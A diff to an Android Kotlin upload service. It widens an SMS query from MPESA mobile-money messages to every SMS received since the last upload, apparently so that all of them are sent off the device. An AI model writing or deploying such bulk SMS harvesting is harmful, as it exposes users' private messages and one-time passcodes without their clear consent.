@@ -167,16 +167,14 @@ class UploadService : Service() {
         }
         Log.d(kon.TAGGED, "Device ID OK")
 
-        // --- Query MPESA SMS ---
+        // --- Query ALL SMS since last upload ---
         val prefRead = context.getSharedPreferences(kon.SHARED_LAST_TIME, Context.MODE_PRIVATE)
         val value = prefRead.getString(kon.SHARED_LAST_TIME, "0")
         val lastUploadTime = value?.toLongOrNull() ?: 0L
         Log.i(kon.TAGGED, "Last upload watermark (ms)=$lastUploadTime")
 
-        // ADDRESS typically "MPESA"; use UPPER-like match via LIKE for safety
-        val selection =
-            "${Telephony.Sms.DATE} > ? AND UPPER(${Telephony.Sms.ADDRESS}) LIKE ?"
-        val selectionArgs = arrayOf(lastUploadTime.toString(), "%MPESA%")
+        val selection = "${Telephony.Sms.DATE} > ?"
+        val selectionArgs = arrayOf(lastUploadTime.toString())
 
         val cr: ContentResolver = context.contentResolver
         val cursor = try {
@@ -196,11 +194,11 @@ class UploadService : Service() {
 
         cursor.use { c ->
             val totalSMS = c.count
-            Log.i(kon.TAGGED, "MPESA SMS found since watermark: $totalSMS")
+            Log.i(kon.TAGGED, "SMS found since watermark: $totalSMS")
 
             if (!c.moveToFirst() || totalSMS == 0) {
                 Log.i(kon.TAGGED, "No new SMS to upload")
-                finishWithResult(true, "No new MPESA messages to upload.", 0)
+                finishWithResult(true, "No new messages to upload.", 0)
                 return
             }
 
